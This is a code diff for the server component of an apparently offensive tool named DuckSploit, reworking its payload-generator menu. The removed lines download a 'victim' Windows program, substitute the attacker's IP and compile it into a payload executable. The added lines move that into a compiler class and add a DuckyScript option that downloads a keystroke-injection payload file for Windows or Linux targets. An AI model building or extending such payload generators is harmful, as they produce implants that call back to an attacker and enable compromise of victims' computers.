@@ -11,6 +11,7 @@ using System.IO.Compression;
 using System.Web;
 using System.Threading;
 using System.Text.RegularExpressions;
+using DScompiler;
 
 namespace DSserver
 {
@@ -416,6 +417,7 @@ namespace DSserver
 				}
 				else if(menu == "3")
 				{
+					// payload generator
 					Console.Clear();
 					int b = 0;
 					while(b == 0)
@@ -436,6 +438,10 @@ namespace DSserver
 						// # Android
 						sendmsgnonewline("    [", "yellow");
 						sendmsgnonewline("4", "red");
+						sendmsg("] DuckyScript", "yellow");
+						// # Android
+						sendmsgnonewline("    [", "yellow");
+						sendmsgnonewline("5", "red");
 						sendmsg("] Exit", "yellow");
 						// # exit
 
@@ -447,46 +453,23 @@ namespace DSserver
 						sendmsgnonewline("3", "yellow");
 						sendmsgnonewline(",", "red");
 						sendmsgnonewline("4", "yellow");
+						sendmsgnonewline(",", "red");
+						sendmsgnonewline("5", "yellow");
 						sendmsgnonewline("]: ", "green");
 						
 						string menu2 = Console.ReadLine(); 
 						if(menu2 == "1")
 						{
+							//windows payload
 							Console.Clear();
-							
-							if (File.Exists(@"C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe")) {
-								sendmsg("[o] csc.exe v3.5 is installed", "yellow");
-								Console.WriteLine(" ");
-								
-								sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
-								string myip = Console.ReadLine(); 
-								
-								sendmsg("Downloading executable...", "yellow");
-								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "\\DSwindows.cs");
-								sendmsg("Downloaded!", "yellow");
-								
-								string text = File.ReadAllText(tempdir + "\\DSwindows.cs");
-								text = text.Replace("<yourip>", myip);
-								File.WriteAllText(tempdir + "\\DSwindows.cs", text);
-								Console.Clear();
-								sendmsg("Loading...", "yellow");
-								
-								execute_cmd("mkdir " + dir + "\\generated");
-								execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:" + dir + "\\generated\\DSWindows_payload.exe %temp%\\DSwindows.cs");
-								Console.Clear();
-								
-								sendmsg("DS payload is now generated! ", "yellow");
-								sendmsg("Can be found at: " + dir + "\\generated\\DSWindows_payload.exe", "yellow");
-							}
-							else
-							{
-								sendmsg("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
-							}
+							compiler compiler = new compiler();
+							compiler.compile("win");
 							b = 1;
 							Console.ReadKey();
 						}
 						else if(menu2 == "2")
 						{
+							// linux payload
 							Console.Clear();
 							Console.WriteLine("Not avaliable");
 							b = 1;
@@ -494,8 +477,8 @@ namespace DSserver
 						}
 						else if(menu2 == "3")
 						{
+							// android payload
 							Console.Clear();
-							
 							if (Directory.Exists(@"C:\\Program Files\\Java")) {
 								sendmsg("[o] java.exe is installed (check if it's version jdk 18)", "yellow");
 								Console.WriteLine(" ");
@@ -558,13 +541,71 @@ namespace DSserver
 						}
 						else if(menu2 == "4")
 						{
+							// duckyscript payloads
+							Console.Clear();
+							int d = 0;
+							while(d == 0)
+							{
+								sendmsg("DuckSploit payload generator (DuckyScript)", "green");
+								Console.WriteLine(" ");
+								sendmsgnonewline("    [", "yellow");
+								sendmsgnonewline("1", "red");
+								sendmsg("] Windows", "yellow");
+								// # Windows
+								sendmsgnonewline("    [", "yellow");
+								sendmsgnonewline("2", "red");
+								sendmsg("] Linux", "yellow");
+								// # Linux
+								sendmsgnonewline("    [", "yellow");
+								sendmsgnonewline("3", "red");
+								sendmsg("] Exit", "yellow");
+								// # Exit
+
+								sendmsgnonewline("Choose option [", "green");
+								sendmsgnonewline("1", "yellow");
+								sendmsgnonewline(",", "red");
+								sendmsgnonewline("2", "yellow");
+								sendmsgnonewline(",", "red");
+								sendmsgnonewline("3", "yellow");
+								sendmsgnonewline("]: ", "green");
+								
+								string menu3 = Console.ReadLine(); 
+								if(menu3 == "1")
+								{
+									Console.Clear();
+									compiler compiler = new compiler();
+									compiler.compile("win");
+									Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/payloads/payload.dd", dir + "\\generated\\payload.dd");
+									sendmsg("DuckyScript payload is generated", "yellow");
+									sendmsg("Can be found at: " + dir + "\\generated\\payload.dd", "yellow");
+									d = 1;
+									Console.ReadKey();
+								}
+								if(menu3 == "2")
+								{
+									Console.Clear();
+									compiler compiler = new compiler();
+									compiler.compile("lin");
+									d = 1;
+									Console.ReadKey();
+								}
+								if(menu3 == "3")
+								{
+									Console.Clear();
+									d = 1;
+								}
+							}
+							b = 1;
+						}
+						else if(menu2 == "5")
+						{
 							Console.Clear();
 							b = 1;
 						}
 						else
 						{
 							Console.Clear();
-							sendmsg("[x] Bad awnser, only 1,2,3,4 accepted", "red");
+							sendmsg("[x] Bad awnser, only 1,2,3,4,5 accepted", "red");
 						}
 					}
 					b = 0;
